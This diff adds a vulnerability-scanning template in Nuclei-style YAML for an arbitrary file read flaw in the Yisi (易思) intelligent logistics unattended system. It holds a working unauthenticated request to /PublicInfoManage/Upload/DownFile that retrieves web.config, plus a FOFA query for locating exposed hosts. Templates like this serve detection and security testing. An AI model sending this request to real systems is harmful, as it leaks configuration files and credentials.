@@ -1,0 +1,31 @@
+http:
+    - matchers:
+        - condition: and
+          part: body
+          type: word
+          words:
+            - <?xml version="1.0"
+            - <configuration>
+            - </configuration>
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      raw:
+        - |
+          GET /PublicInfoManage/Upload/DownFile?filePath=web.config HTTP/1.1
+          Host: {{Hostname}}
+          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+id: yisi-DownFile-File-reading
+info:
+    author: Superhero
+    description: |-
+        fofa: body="/api/SingleLogin"
+        易思智能物流无人值守系统 DownFile 存在任意文件读取漏洞,未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。
+    name: 易思智能物流无人值守系统 DownFile 任意文件读取漏洞
+    reference:
+        - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247489249&idx=1&sn=681d53a14ea3ead473d8f3deff5a9ca7&chksm=c267a3d2f5102ac4874234ce25d5966cbdd8cce984eb63f9cc09904871d5de38a696bc789db5&token=1526905597&lang=zh_CN#rd
+    severity: high
+    tags:
+        - File reading
+        - 易思智能物流无人值守系统
